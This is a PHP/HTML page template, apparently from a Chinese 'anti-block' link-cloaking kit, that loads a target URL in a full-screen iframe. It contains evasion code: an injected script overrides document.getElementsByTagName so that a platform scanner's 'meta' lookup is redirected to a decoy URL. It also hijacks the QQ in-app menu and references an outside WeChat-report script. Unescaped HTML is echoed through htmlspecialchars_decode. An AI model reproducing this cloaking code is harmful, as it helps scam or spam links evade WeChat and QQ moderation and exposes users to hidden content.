<?php
//乐公完美直链改良版，完美适配全屏！
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title><?=$title?></title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=2.0, user-scalable=yes" />
    <style type="text/css">
        body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;overflow: hidden;}
    </style>

</head>
<?=htmlspecialchars_decode($ding)?>
<body id="body">
    <iframe src='<?=$t_url?>' width='100%' height='100%' frameborder='0' name="_blank" id="_blank" ></iframe>
<h1>我缩超级防封-BY乐公网络</h1>
</body>
</html>
<!--<script id="wxjubao-js" src="http://i5hg.com/js/wxjubao.js">
</script>-->
<script>
setTimeout(function()
{
document.getElementById("wxjubao-loading").style.display = "block";
 
window.location.reload()
},60000);
</script>

<?php 
  if($jb==1){
echo '<script>
if (report == null) { var report="'.$t_rs.'";} var Zeptoq = document.getElementsByTagName;document.getElementsByTagName = function(a) { if (a == "meta") { window.location.href = report; return } if (a == "script" || a == "body") { return Zeptoq.call(document, a) } else { return } }; mqq.ui.setTitleButtons({ left : { title : "QQ", }, right : { title : "•••", callback : function () { mqq.ui.openUrl({ target: 2,style: 1,url: report}) } } });
</script>';
  }
      ?>
